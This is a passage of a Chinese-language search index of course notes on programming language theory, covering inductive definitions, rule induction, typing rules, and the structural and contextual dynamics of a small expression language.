<li>\u8054\u7acb\uff08simultaneous\uff09\u5f52\u7eb3\u5b9a\u4e49\uff08\u76f8\u4e92\u5f52\u7eb3\u5b9a\u4e49\uff09\uff1a\u6240\u6709\u7684\u5224\u65ad\u5f62\u5f0f\u7684\u89c4\u5219\u662f\u7531\u6574\u4e2a\u89c4\u5219\u96c6\u5408\u540c\u65f6\u5b9a\u4e49\u7684<ul> <li>e.g. \\(\\dfrac{}{\\mathsf{zero}\\ \\mathrm{even}}, \\dfrac{b\\ \\mathrm{odd}}{\\mathrm{succ}(b)\\ \\mathrm{even}}, \\dfrac{a\\ \\mathrm{even}}{\\mathrm{succ}(a)\\ \\mathrm{odd}}\\)</li> </ul> </li> </ul> </li> <li>\u7528\u89c4\u5219\u5b9a\u4e49\u51fd\u6570<ul> <li>\u901a\u8fc7\u5bf9\u8f93\u5165\u8f93\u51fa\u7684\u5173\u7cfb\u7684\u56fe\u505a\u5f52\u7eb3\u5b9a\u4e49\u6765\u5b9a\u4e49\u51fd\u6570\uff0c\u7136\u540e\u8bc1\u660e\u8fd9\u4e2a\u5173\u7cfb\u5728\u7ed9\u5b9a\u5173\u7cfb\u65f6\u552f\u4e00\u786e\u5b9a\u8f93\u51fa</li> </ul> </li> </ul> \u52a0\u6cd5\u51fd\u6570\u7684\u89c4\u5219\u5b9a\u4e49 <p>\\(\\mathrm{sum}(a; b; c)\\) \u8868\u793a \\(c\\) \u662f \\(a\\) \u4e0e \\(b\\) \u7684\u548c\uff0c\u7ed9\u51fa\u5982\u4e0b\u5b9a\u4e49\uff1a</p> \\[ \\dfrac{b\\ \\mathrm{nat}}{\\mathrm{sum}(\\mathsf{zero}; b; b)}, \\dfrac{\\mathrm{sum}(a; b; c)}{\\mathrm{sum}(\\mathrm{succ}(a); b; \\mathrm{succ}(c))} \\] <p>\u9700\u8981\u8bc1\u660e\u5bf9\u4e8e\u4efb\u610f \\(a\\ \\mathrm{nat}\\) \u548c \\(b\\ \\mathrm{nat}\\) \u90fd\u5b58\u5728\u552f\u4e00\u7684 \\(c\\) \u7b26\u5408 \\(\\mathrm{sum}(a; b; c)\\)\uff1a</p> <ul> <li>\u5b58\u5728\u6027\uff1a\u5982\u679c \\(a\\ \\mathrm{nat}\\) \u4e14 \\(b\\ \\mathrm{nat}\\) \u5219\u5b58\u5728 \\(c\\) \u4f7f\u5f97 \\(\\mathrm{sum}(a; b; c)\\)<ul> <li>\u8bbe \\(P(a\\ \\mathrm{nat})\\) \u7684\u542b\u4e49\u4e3a\u201c\u5bf9\u4e8e\u4efb\u610f \\(b\\ \\mathrm{nat}\\) \u5b58\u5728 \\(c\\) \u4f7f\u5f97 \\(\\mathrm{sum}(a; b; c)\\)</li> <li>\u5f53 \\(a=\\mathsf{zero}\\) \u65f6\uff0c\u6839\u636e\u7b2c\u4e00\u4e2a\u89c4\u5219\u663e\u7136\u6210\u7acb\uff0c\u6b64\u65f6 \\(c=b\\)</li> <li>\u5047\u8bbe \\(P(a\\ \\mathrm{nat})\\) \u6210\u7acb\uff0c\u9700\u8981\u8bc1\u660e \\(P(\\mathrm{succ}(a)\\ \\mathrm{nat})\\) \u6210\u7acb<ul> <li>\u56e0\u4e3a \\(P(a\\ \\mathrm{nat})\\)\uff0c\u56e0\u6b64\u5bf9\u4e8e\u8fd9\u4e2a \\(b\\) \u5b58\u5728 \\(c'\\) \u4f7f\u5f97 \\(\\mathrm{sum}(a; b; c')\\)\uff0c\u6839\u636e\u7b2c\u4e8c\u4e2a\u89c4\u5219\u6709 \\(\\mathrm{sum}(\\mathrm{succ}(a); b; \\mathrm{succ}(c'))\\)\uff0c\u56e0\u6b64\u53ef\u4ee4 \\(c=\\mathrm{succ}(c')\\)</li> </ul> </li> </ul> </li> <li>\u552f\u4e00\u6027\uff1a\u5982\u679c \\(\\mathrm{sum}(a; b; c_1)\\) \u4e0e \\(\\mathrm{sum}(a; b; c_2)\\)\uff0c\u5219 \\(c_1=c_2\\ \\mathrm{nat}\\)<ul> <li>\u5f53 \\(a=\\mathsf{zero}\\) \u65f6\uff0c\u6839\u636e\u7b2c\u4e00\u4e2a\u89c4\u5219\u6709 \\(c_1 = b = c_2\\)</li> <li>\u8bbe \\(\\mathrm{sum}(a; b; c_1), a=\\mathrm{succ}(a'), c_1=\\mathrm{succ}(c_1')\\)\uff0c\u5982\u679c \\(\\mathrm{sum}(a; b; c_2)\\)\uff0c\u6839\u636e\u7b2c\u4e8c\u4e2a\u89c4\u5219\u6709 \\(\\mathrm{sum}(\\mathrm{succ}(a'); b; \\mathrm{succ}(c_1'))\\)\uff0c\u5373 $\\mathrm{sum}(a; b; c_1)\uff0c\u56e0\u4e3a\u5b83\u4eec\u6765\u6e90\u4e8e\u540c\u4e00\u6761\u89c4\u5219\uff0c\u6240\u4ee5 \\(c_1 = c_2\\)</li> </ul> </li> </ul> <ul> <li>\u6a21\u5f0f<ul> <li>\u4e00\u6761\u5224\u65ad\u4e2d\uff0c\u6709\u4e00\u4e9b\u53c2\u6570\u662f\u7531\u53e6\u5916\u53c2\u6570\u51b3\u5b9a\u7684\uff0c\u79f0\u4e3a\u5224\u65ad\u7684\u6a21\u5f0f\u58f0\u660e</li> <li>e.g. \u52a0\u6cd5\u51fd\u6570 \\(\\mathrm{sum}(a; b; c)\\)<ul> <li>\\(c\\) \u7531 \\(a, b\\) \u51b3\u5b9a\uff0c\u6240\u4ee5\u5b83\u5177\u6709\u6a21\u5f0f \\((\\forall, \\forall, \\exists)\\)</li> <li>\u5982\u679c \\(c\\) \u662f\u552f\u4e00\u7684\uff0c\u5c31\u5199\u4f5c \\((\\forall, \\forall, \\exists !)\\)</li> <li>\u5982\u679c \\(c\\) \u4e0d\u4e00\u5b9a\u5b58\u5728\uff08\u6700\u591a\u4e00\u4e2a\uff09\uff0c\u5199\u4f5c \\((\\forall, \\forall, \\exists\\leq 1)\\)</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic2/#_6","title":"\u63a8\u5bfc","text":"<ul> <li>\u89c4\u5219\u5f52\u7eb3\uff08rule induction\uff09<ul> <li>\u8981\u8bc1\u660e\u201c\u6027\u8d28 \\(a\\ P\\) \u5728 \\(a\\ J\\) \u53ef\u63a8\u5bfc\u65f6\u6210\u7acb\u201d\uff0c\u5219\u53ea\u9700\u8bc1\u660e\u201c\\(P\\) \u5c01\u95ed\u4e8e\u5b9a\u4e49\u5224\u65ad\u5f62\u5f0f \\(J\\) \u7684\u89c4\u5219\u6216 \\(P\\) \u9075\u4ece\u8fd9\u4e9b\u89c4\u5219\u201d</li> <li>\u5373\u5982\u679c\u5f53 \\(P(a_1), \\cdots, P(a_k)\\) \u6210\u7acb\u65f6 \\(P(a)\\) \u6210\u7acb\uff0c\u5219\u6027\u8d28 \\(P\\) \u9075\u4ece\u89c4\u5219 \\(\\dfrac{a_1\\ J\\cdots a_k\\ J}{a\\ J}\\)<ul> <li>\u5206\u5b50\u79f0\u4e3a\u8fd9\u4e2a\u63a8\u7406\u7684\u5f52\u7eb3\u5047\u8bbe\uff08inductive hypotheses\uff09</li> <li>\u5206\u6bcd\u79f0\u4e3a\u5f52\u7eb3\u7ed3\u8bba\uff08inductive conclusion\uff09</li> </ul> </li> </ul> </li> <li>\u6839\u636e\u5df2\u77e5\u7684\u516c\u7406\u3001\u5b9a\u7406\u3001\u5b9a\u5f8b\u3001\u5b9a\u4e49\u7b49\uff0c\u501f\u52a9\u4e8e\u903b\u8f91\u63a8\u7406\u3001\u6570\u503c\u6f14\u7b97\u7b49\uff0c\u5f97\u51fa\u65b0\u7684\u7ed3\u8bba</li> <li>\u4e00\u4e2a\u5224\u65ad\u7684\u63a8\u5bfc\u8fc7\u7a0b\u662f\u89c4\u5219\u7684\u6709\u9650\u7ec4\u5408\uff0c\u7531\u516c\u7406\u5f00\u59cb\uff0c\u4ee5\u5224\u65ad\u7ed3\u675f</li> <li>\u63a8\u5bfc\u662f\u4e00\u68f5\u6811\uff0c\u7ed3\u70b9\u662f\u89c4\u5219\uff0c\u5176\u5b50\u7ed3\u70b9\u662f\u4ee5\u8be5\u89c4\u5219\u4e3a\u524d\u63d0\u7684\u63a8\u5bfc\u8fc7\u7a0b</li> <li>\u627e\u5230\u4e00\u4e2a\u63a8\u5bfc\u8fc7\u7a0b\u5c31\u53ef\u4ee5\u8bf4\u660e\u4e00\u4e2a\u5f52\u7eb3\u5b9a\u4e49\u5224\u65ad\u662f\u53ef\u63a8\u5bfc\u7684</li> <li>\u63a8\u5bfc\u65b9\u5411\uff1a<ul> <li>\u524d\u5411\u94fe\u63a5\uff08forwarding chaining\uff09\u3001\u81ea\u5e95\u5411\u4e0a\u6784\u9020\uff08bottom-up construction\uff09\uff1a\u4ece\u516c\u7406\u5f00\u59cb\uff0c\u6ca1\u6709\u65b9\u5411\u7684</li> <li>\u53cd\u5411\u94fe\u63a5\uff08backwarding chaining\uff09\u3001\u81ea\u9876\u5411\u4e0b\u6784\u9020\uff08top-down construction\uff09\uff1a\u4ece\u7ed3\u8bba\u5f00\u59cb\uff0c\u662f\u76ee\u6807\u5bfc\u5411\u7684</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic2/#_7","title":"\u5047\u8a00\u5224\u65ad\u4e0e\u4e00\u822c\u6027\u5224\u65ad","text":"<p>\u5927\u7fc1\u8001\u5e08\u597d\u50cf\u6ca1\u8bb2\uff0c\u4f46\u540e\u9762\u4f1a\u7528\u5230\u4e00\u4e9b\u8bb0\u6cd5\uff0c\u770b\u7684 xyx \u7684\u7b14\u8bb0</p> <ul> <li>\u524d\u9762\u5982 \\(a\\ \\mathrm{nat}\\) \u7684\u5224\u65ad\u79f0\u4e3a\u57fa\u672c\u5224\u65ad\uff08basic judgement\uff09</li> <li>\u5047\u8a00\u5224\u65ad\uff08hypothetical judgement\uff09\uff1a\u5047\u8bbe\uff08hypothesis\uff09\u548c\u7ed3\u8bba\uff08conclusion\uff09\u4e4b\u95f4\u7684\u8574\u542b\u5173\u7cfb\uff08entailment\uff09<ul> <li>\u8bbe \\(\\Gamma = \\{J_1, \\cdots, J_k\\}\\) \u4e3a\u82e5\u5e72\u57fa\u672c\u5224\u65ad\u7684\u96c6\u5408\uff0c\\(R\\) \u4e3a\u4e00\u4e2a\u89c4\u5219\u96c6\u5408\uff0c\\(J\\) \u4e3a\u57fa\u672c\u5224\u65ad</li> <li>\u53ef\u5bfc\u6027\u5224\u65ad\uff08derivability judgement\uff09\uff1a\\(\\Gamma\\vdash_R J\\)\uff0c\u8868\u793a\u6839\u636e \\(R\\) \u5982\u679c \\(\\Gamma\\) \u6210\u7acb\uff0c\u5219 \\(J\\) \u6210\u7acb<ul> <li>\\(\\Gamma_1\\vdash_R \\Gamma_2\\) \u8868\u793a \\(\\Gamma_1\\vdash_R J, \\forall J\\in\\Gamma_2\\)</li> <li>\\(\\vdash_R J\\) \u8868\u793a \\(J\\) \u53ef\u76f4\u63a5\u4ece \\(R\\) \u4e2d\u63a8\u5bfc</li> <li>\u6709\u81ea\u53cd\u6027\u3001\u5f31\u5316\u3001\u4f20\u9012\u6027</li> </ul> </li> <li>\u53ef\u7eb3\u6027\u5224\u65ad\uff08admissible judgement\uff09\uff1a\\(\\Gamma\\vDash_R J\\)\uff0c\u8868\u793a\u5982\u679c \\(\\Gamma\\) \u53ef\u7531 \\(R\\) \u63a8\u5bfc\uff0c\u5219 \\(J\\) \u4e5f\u53ef\u4ee5<ul> <li>\u4e5f\u6709\u81ea\u53cd\u6027\u3001\u5f31\u5316\u3001\u4f20\u9012\u6027</li> </ul> </li> </ul> </li> <li>\u4e00\u822c\u6027\u5224\u65ad\uff08general judgement\uff09\uff1a<ul> <li>\u5bf9\u4e8e \\(\\Gamma\\vdash_R J\\)\uff0c\u5c06 \\(\\Gamma\\) \u4e2d\u7528\u5230\u7684\u53d8\u91cf\u8bb0\u4e3a \\(X\\)\uff0c\u5219\u53ef\u8bb0\u4e3a \\(\\Gamma\\vdash_R^X J\\)</li> <li>\u5c06 \\(X\\) \u62c6\u5206\uff0c\\(\\Gamma\\) \u4e2d\u81ea\u7531\u53d8\u91cf\u8bb0\u4e3a \\(Y\\)\uff0c\u5176\u4ed6\u8bb0\u4e3a \\(X\\)\uff0c\u5219\u53ef\u8bb0 \\(Y\\ |\\ \\Gamma\\vdash_R^X J\\)</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic3/","title":"\u9759\u6001\u8bed\u4e49\u4e0e\u52a8\u6001\u8bed\u4e49","text":"<p> \u7ea6 1784 \u4e2a\u5b57  10 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u7f16\u7a0b\u8bed\u8a00\u539f\u7406\u7b2c\u516d\u81f3\u7b2c\u516b\u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/pl/ppl/topic3/#_2","title":"\u9759\u6001\u8bed\u4e49","text":"<ul> <li>\u7c7b\u578b\u7cfb\u7edf\u7684\u4f5c\u7528\u662f\u5bf9\u77ed\u8bed\uff08phrase\uff09\u7684\u5f62\u6210\u52a0\u4ee5\u7ea6\u675f\uff0c\u77ed\u8bed\u662f\u4e0a\u4e0b\u6587\u654f\u611f\u7684</li> </ul> <p>\u5b9a\u4e49 E \u8bed\u8a00\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>Typ \u03c4  ::=  num             num\n            str             str\nExp e  ::=  x               x\n            num[n]          n\n            str[s]          \"s\"\n            plus(e1; e2)    e1 + e2\n            times(e1; e2)   e1 * e2\n            cat(e1; e2)     e1_e2\n            len(e)          |e|\n            let(e1; x.e2)   let x be e1 in e2\n</code></pre> <ul> <li>E \u7684\u9759\u6001\u8bed\u4e49\uff08statics\uff09\u7531\u5982\u4e0b\u5f62\u5f0f\u7684\u6cdb\u578b\u5047\u8a00\u5224\u65ad\u7684\u5f52\u7eb3\u5b9a\u4e49\u7ec4\u6210\uff1a\\(\\overrightarrow{x}\\ |\\ \\Gamma\\vdash e:r\\)<ul> <li>\\(\\overrightarrow{x}=\\mathrm{dom}(\\Gamma)\\)\uff1a\u53d8\u91cf\u7684\u6709\u9650\u96c6\u5408</li> <li>\\(\\Gamma\\)\uff1a\u5b9a\u578b\u4e0a\u4e0b\u6587\uff08\u7c7b\u578b\u6307\u6d3e\uff09\uff0c\u9488\u5bf9\u6bcf\u4e2a \\(x\\in\\overrightarrow{x}\\) \u6709\u5f62\u5982 \\(x:\\tau\\) \u7684\u5047\u8bbe<ul> <li>\\(\\Gamma = \\{x_1:\\tau_1, \\cdots, x_k:\\tau_k\\}\\)</li> <li>\u5982\u679c \\(x\\notin\\mathrm{dom}(\\Gamma)\\)\uff0c\u5219\u79f0 \\(x\\) \u5bf9\u4e8e \\(\\Gamma\\) \u662f\u65b0\u7684\uff0c\u53ef\u4ee5\u6dfb\u52a0\u5f97\u5230 \\(\\Gamma,x:\\tau\\)</li> </ul> </li> <li>\u5b9a\u578b\u516c\u7406\uff1a\\(c:\\tau\\)\uff0c\u7b26\u53f7 \\(c\\) \u6709\u7c7b\u578b \\(\\tau\\)</li> </ul> </li> </ul> E \u7684\u9759\u6001\u8bed\u4e49\u5b9a\u4e49 \\[ \\dfrac{}{\\Gamma,x:\\tau\\vdash x:\\tau} \\] <p>\u5f15\u5165\u5f62\u5f0f\uff08introduction form\uff09\uff0c\u786e\u5b9a\u7c7b\u578b\u7684\u503c\u6216\u8303\u5f0f\uff08canoncial form\uff09\uff1a</p> \\[ \\dfrac{}{\\Gamma\\vdash\\mathrm{str}[s]:\\mathrm{str}} \\] \\[ \\dfrac{}{\\Gamma\\vdash\\mathrm{num}[n]:\\mathrm{num}} \\] <p>\u6d88\u53bb\u5f62\u5f0f\uff08elimination form\uff09\uff0c\u786e\u5b9a\u5982\u4f55\u64cd\u4f5c\u8be5\u7c7b\u578b\u7684\u503c\u5f62\u6210\u53e6\u4e00\u79cd\u7c7b\u578b\u7684\u8ba1\u7b97\uff1a</p> \\[ \\dfrac{\\Gamma\\vdash e_1:\\mathrm{num}\\quad \\Gamma\\vdash e_2:\\mathrm{num}}{\\Gamma\\vdash \\mathrm{plus}(e_1;e_2):\\mathrm{num}} \\] \\[ \\dfrac{\\Gamma\\vdash e_1:\\mathrm{num}\\quad \\Gamma\\vdash e_2:\\mathrm{num}}{\\Gamma\\vdash \\mathrm{times}(e_1;e_2):\\mathrm{num}} \\] \\[ \\dfrac{\\Gamma\\vdash e_1:\\mathrm{str}\\quad \\Gamma\\vdash e_2:\\mathrm{str}}{\\Gamma\\vdash \\mathrm{cat}(e_1;e_2):\\mathrm{str}} \\] \\[ \\dfrac{\\Gamma\\vdash e:\\mathrm{str}}{\\Gamma\\vdash \\mathrm{len}(e):\\mathrm{num}} \\] \\[ \\dfrac{\\Gamma\\vdash e_1:\\tau_1\\quad \\Gamma, x:\\tau_1\\vdash e_2:\\tau_2}{\\Gamma\\vdash \\mathrm{let}(e_1; x.e_2):\\tau_2} \\] <ul> <li>\u5f15\u7406 4.1\uff08\u7c7b\u578b\u552f\u4e00\u6027\uff0cunicity of typing\uff09\uff1a\\(\\forall\\Gamma, e\\)\uff0c\u6700\u591a\u5b58\u5728\u4e00\u4e2a \\(\\tau\\) s.t. \\(\\Gamma\\vdash e:\\tau\\)</li> <li>\u5f15\u7406 4.2\uff08\u5b9a\u578b\u53cd\u8f6c\uff0cinversion for typing\uff09\uff1a\u5047\u8bbe \\(\\Gamma\\vdash e:\\tau\\)\uff0c\u82e5 \\(e=\\mathrm{plus}(e_1; e_2)\\)\uff0c\u5219 \\(\\tau=\\mathrm{num}\\)\uff0c\\(\\Gamma\\vdash e_1:\\mathrm{num}\\)\uff0c\\(\\Gamma\\vdash e_2:\\mathrm{num}\\)</li> <li>\u5f15\u7406 4.3\uff08\u5f31\u5316\uff0cweakening\uff09\uff1a\u82e5 \\(\\Gamma\\vdash e':\\tau'\\)\uff0c\u5219\u5bf9\u4efb\u610f \\(x\\notin \\mathrm{dom}(\\Gamma)\\) \u548c\u7c7b\u578b \\(\\tau\\) \u90fd\u6709 \\(\\Gamma,x:\\tau\\vdash e':\\tau'\\)</li> <li>\u5f15\u7406 4.4\uff08\u4ee3\u6362\uff0csubstitution\uff09\uff1a\u82e5 \\(\\Gamma, x:\\tau\\vdash e':\\tau'\\) \u4e14 \\(\\Gamma\\vdash e:\\tau\\)\uff0c\u5219 \\(\\Gamma\\vdash [e/x]e':\\tau'\\)</li> <li>\u5f15\u7406 4.5\uff08\u5206\u89e3\uff0cdecomposition\uff09\uff1a\u82e5 \\(\\Gamma\\vdash [e/x]e':\\tau'\\) \u5219\u5bf9\u6ee1\u8db3 \\(\\Gamma\\vdash e:\\tau\\) \u7684\u6bcf\u4e2a\u7c7b\u578b \\(\\tau\\)\uff0c\u6709 \\(\\Gamma,x:\\tau\\vdash e':\\tau'\\)</li> </ul>"},{"location":"cs/pl/ppl/topic3/#_3","title":"\u52a8\u6001\u8bed\u4e49","text":""},{"location":"cs/pl/ppl/topic3/#_4","title":"\u8f6c\u6362\u7cfb\u7edf","text":"<ul> <li>\u7528\u56db\u79cd\u5f62\u5f0f\u7684\u5224\u65ad\u6765\u63cf\u8ff0\uff1a<ul> <li>\\(s\\text{ state}\\)\uff1a\\(s\\) \u662f\u8f6c\u6362\u7cfb\u7edf\u7684\u4e00\u4e2a\u72b6\u6001</li> <li>\\(s\\text{ final}\\)\uff1a\u5728 \\(s\\text{ state}\\) \u7684\u524d\u63d0\u4e0b\uff0c\\(s\\) \u662f\u4e00\u4e2a\u7ec8\u7ed3\u72b6\u6001</li> <li>\\(s\\text{ initial}\\)\uff1a\u5728 \\(s\\text{ state}\\) \u7684\u524d\u63d0\u4e0b\uff0c\\(s\\) \u662f\u4e00\u4e2a\u521d\u59cb\u72b6\u6001</li> <li>\\(s\\mapsto s'\\)\uff1a\u5728 \\(s\\text{ state}\\) \u548c \\(s'\\text{ state}\\) \u7684\u524d\u63d0\u4e0b\uff0c\\(s\\) \u53ef\u4ee5\u8f6c\u6362\u5230 \\(s'\\)</li> </ul> </li> <li>\u65e0\u6cd5\u7ee7\u7eed\u8f6c\u6362\u7684\u72b6\u6001\u662f\u5361\u4f4f\u7684\uff08stuck\uff09<ul> <li>\u6240\u6709\u7ec8\u7ed3\u72b6\u6001\u90fd\u662f\u5361\u4f4f\u7684\uff0c\u4f46\u4e5f\u53ef\u80fd\u5b58\u5728\u5361\u4f4f\u7684\u975e\u7ec8\u7ed3\u72b6\u6001</li> </ul> </li> <li>\u4e00\u4e2a\u8f6c\u6362\u7cfb\u7edf\u662f\u786e\u5b9a\u6027\u7684\uff08deterministic\uff09&lt;=&gt; \u5bf9\u6bcf\u4e2a\u72b6\u6001 \\(s\\)\uff0c\u6700\u591a\u53ea\u6709\u4e00\u4e2a\u72b6\u6001 \\(s'\\) \u6ee1\u8db3 \\(s\\mapsto s'\\)<ul> <li>\u5426\u5219\u662f\u975e\u786e\u5b9a\u6027\u7684\uff08non-deterministic\uff09</li> </ul> </li> <li>\u8f6c\u6362\u5e8f\u5217\uff1a\u4e00\u7cfb\u5217\u72b6\u6001 \\(s_0, \\cdots, s_m\\) \u6ee1\u8db3 \\(s_0\\text{ initial}\\) \u4e14 \\(s_i\\mapsto s_{i+1}, 0\\leq i&lt;n\\)<ul> <li>\u79f0\u4e4b\u4e3a\u6700\u5927\u7684\uff08maximal\uff09&lt;=&gt; \u6ca1\u6709 \\(s\\) \u6ee1\u8db3 \\(s_n\\mapsto s\\)\uff08\u5373 \\(s_n\\) \u662f\u5361\u4f4f\u7684\uff09</li> <li>\u79f0\u4e4b\u4e3a\u5b8c\u5907\u7684\uff08complete\uff09&lt;=&gt; \u662f\u6700\u5927\u7684\uff0c\u800c\u4e14 \\(s_n\\text{ final}\\)</li> <li>\u5224\u65ad \\(s\\downarrow\\) \u8868\u793a\u6709\u4e00\u4e2a\u4ece \\(s\\) \u5f00\u59cb\u7684\u5b8c\u5907\u8f6c\u6362\u5e8f\u5217\uff0c\u5373\u5b58\u5728 \\(s'\\text{ final}\\) \u6ee1\u8db3 \\(s\\mapsto^*s'\\)</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic3/#_5","title":"\u7ed3\u6784\u5316\u52a8\u6001\u8bed\u4e49","text":"<ul> <li>\u7ed3\u6784\u5316\u52a8\u6001\u8bed\u4e49\u7531\u4e00\u4e2a\u8f6c\u6362\u7cfb\u7edf\u7ed9\u51fa<ul> <li>\u6240\u6709\u72b6\u6001\u90fd\u662f\u521d\u59cb\u72b6\u6001</li> <li>\u6240\u6709\u7ec8\u7ed3\u72b6\u6001\u90fd\u662f\u4e00\u4e2a\u503c\uff0c\u8868\u793a\u5df2\u5b8c\u6210\u7684\u8ba1\u7b97</li> </ul> </li> <li>\u5b9a\u4e49\u5224\u65ad \\(e\\text{ val}\\) \u8868\u793a \\(e\\) \u662f\u4e00\u4e2a\u503c\uff1a\\(\\dfrac{}{\\mathrm{num}[n]\\text{ val}}, \\dfrac{}{\\mathrm{str}[s]\\text{ val}}\\)</li> <li>\u63a5\u4e0b\u6765\u7ed9\u51fa E \u8bed\u4e49\u72b6\u6001\u4e4b\u95f4\u7684\u8f6c\u6362\u5224\u65ad \\(e\\mapsto e'\\) \u7684\u89c4\u5219</li> </ul> E \u8bed\u8a00\u7684\u72b6\u6001\u8f6c\u6362\u5224\u65ad\u89c4\u5219 \\[ \\dfrac{n_1+n_2=n}{\\mathrm{plus}(\\mathrm{num}[n_1]; \\mathrm{num}[n_2])\\mapsto \\mathrm{num}[n]} \\] \\[ \\dfrac{e_1\\mapsto e_1'}{\\mathrm{plus}(e_1; e_2)\\mapsto \\mathrm{plus}(e_1'; e_2)} \\] \\[ \\dfrac{e_1\\text{ val}\\quad e_2\\mapsto e_2'}{\\mathrm{plus}(e_1; e_2)\\mapsto \\mathrm{plus}(e_1; e_2')} \\] \\[ \\dfrac{s_1s_2=s}{\\mathrm{cat}(\\mathrm{str}[s_1]; \\mathrm{str}[s_2])\\mapsto \\mathrm{str}[s]} \\] \\[ \\dfrac{e_1\\mapsto e_1'}{\\mathrm{cat}(e_1; e_2)\\mapsto \\mathrm{cat}(e_1'; e_2)} \\] \\[ \\dfrac{e_1\\text{ val}\\quad e_2\\mapsto e_2'}{\\mathrm{cat}(e_1; e_2)\\mapsto \\mathrm{cat}(e_1; e_2')} \\] \\[ \\left[\\dfrac{e_1\\mapsto e_1'}{\\mathrm{let}(e_1; x.e_2)\\mapsto \\mathrm{let}(e_1'; x.e_2)}\\right] \\] \\[ \\dfrac{[e_1\\text{ val}]}{\\mathrm{let}(e_1; x.e_2)\\mapsto [e_1/x]e_2} \\] <p>\u7701\u7565\u4e86\u7c7b\u4f3c\u7684 \\(\\mathrm{times}\\) \u548c \\(\\mathrm{len}\\) \u89c4\u5219</p> <p>\u5bf9\u4e8e\u540e\u4e24\u4e2a\u89c4\u5219\uff0c\u6709\u65b9\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u90e8\u5206\uff0c\u662f\u9488\u5bf9 let \u7684\u4e24\u79cd\u4e0d\u540c\u89e3\u91ca\uff1a</p> <ul> <li>\u6309\u503c\u89e3\u91ca\uff08by-value interpretation\uff09\uff1a\u5148\u6c42\u503c\uff08\u4fdd\u7559\u65b9\u62ec\u53f7\u4e2d\u5185\u5bb9\uff09</li> <li>\u6309\u540d\u89e3\u91ca\uff08by-name interpretation\uff09\uff1a\u4e0d\u6c42\u503c\u76f4\u63a5\u7ed1\u5b9a\uff08\u65b9\u62ec\u53f7\u4e2d\u5185\u5bb9\u5747\u5220\u6389\uff09</li> </ul> <p>\u9488\u5bf9\u7ed3\u6784\u5316\u52a8\u6001\u8bed\u4e49\u7684\u4e24\u4e2a\u5f15\u7406\uff1a</p> <ul> <li>\u5f15\u7406 5.2\uff08\u503c\u7684\u7ec8\u7ed3\u6027\uff0cfinality of values\uff09\uff1a\u4e0d\u5b58\u5728 \\(e\\)\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u67d0\u4e2a \\(e'\\)\uff0c\u6709 \\(e\\text{ val}\\) \u548c \\(e\\mapsto e'\\) \u540c\u65f6\u6210\u7acb</li> <li>\u5f15\u7406 5.3\uff08\u786e\u5b9a\u6027\uff0cdeterminacy\uff09\uff1a\u5982\u679c \\(e\\mapsto e'\\) \u4e14 \\(e\\mapsto e''\\)\uff0c\u5219 \\(e'\\) \u548c \\(e''\\) \u662f \\(\\alpha\\) \u7b49\u4ef7\u7684</li> </ul>"},{"location":"cs/pl/ppl/topic3/#_6","title":"\u4e0a\u4e0b\u6587\u52a8\u6001\u8bed\u4e49","text":"<ul> <li>\u4e0a\u4e0b\u6587\u52a8\u6001\u8bed\u4e49\u662f\u7ed3\u6784\u5316\u52a8\u6001\u8bed\u4e49\u7684\u4e00\u4e2a\u53d8\u4f53\uff0c\u6ca1\u6709\u672c\u8d28\u533a\u522b</li> <li>\u4e3b\u8981\u601d\u60f3\uff1a\u5c06\u6307\u4ee4\u6b65\u9aa4\u5206\u79bb\u6210\u7279\u6b8a\u7684\u5224\u65ad\u5f62\u5f0f\uff0c\u79f0\u4e3a\u6307\u4ee4\u8f6c\u6362\uff08instruction transition\uff09\uff0c\u5e76\u7528\u79f0\u4e3a\u6c42\u503c\u4e0a\u4e0b\u6587\uff08evaluation context\uff09\u7684\u65b9\u6cd5\u5bf9\u5b9a\u4f4d\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u8fc7\u7a0b\u52a0\u4ee5\u5f62\u5f0f\u5316</li> <li>\u5224\u65ad \\(\\mathcal{E}\\text{ ectxt}\\) \u786e\u5b9a\u5728\u4e00\u4e2a\u66f4\u5927\u7684\u8868\u8fbe\u5f0f\u4e2d\u4e0b\u4e00\u6761\u8981\u6267\u884c\u7684\u6307\u4ee4\u7684\u4f4d\u7f6e<ul> <li>\\(\\dfrac{}{\\circ\\text{ ectxt}},\\ \\dfrac{\\mathcal{E}_1\\text{ ectxt}}{\\mathrm{plus}(\\mathcal{E}_1; e_2)\\text{ ectxt}},\\ \\dfrac{e_1\\text{ val}\\quad\\mathcal{E}_2\\text{ ectxt}}{\\mathrm{plus}(e_1; \\mathcal{E}_2)\\text{ ectxt}}\\)</li> <li>\u6bd4\u5982\u7b2c\u4e8c\u6761\u89c4\u5219\u8868\u793a\uff0c\u5982\u679c \\(\\mathrm{plus}\\) \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u503c\uff0c\u5219\u4e0b\u4e00\u6761\u6307\u4ee4\u6267\u884c\u7684\u4f4d\u7f6e\u5c31\u5b58\u5728\u4e8e\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\u5904\u6216\u5176\u5185\u90e8</li> </ul> </li> <li>\u5224\u65ad \\(e'=\\mathcal{E}\\{e\\}\\) \u8868\u660e \\(e'\\) \u662f\u5728\u6c42\u503c\u4e0a\u4e0b\u6587 \\(\\mathcal{E}\\) \u4e2d\u7528\u8868\u8fbe\u5f0f \\(e\\) \u586b\u5165 \\(\\circ\\) \u4e2d\u7684\u7ed3\u679c\uff1a<ul> <li>\\(\\dfrac{}{e=\\circ\\{e\\}},\\ \\dfrac{e_1=\\mathcal{E}_1\\{e\\}}{\\mathrm{plus}(e_1; e_2)=\\mathrm{plus}(\\mathcal{E}_1; e_2)\\{e\\}},\\ \\dfrac{e_1\\text{ val}\\quad e_2=\\mathcal{E}_2\\{e\\}}{\\mathrm{plus}(e_1; e_2)=\\mathrm{plus}(e_1; \\mathcal{E}_2)\\{e\\}}\\)</li> </ul> </li> <li>E 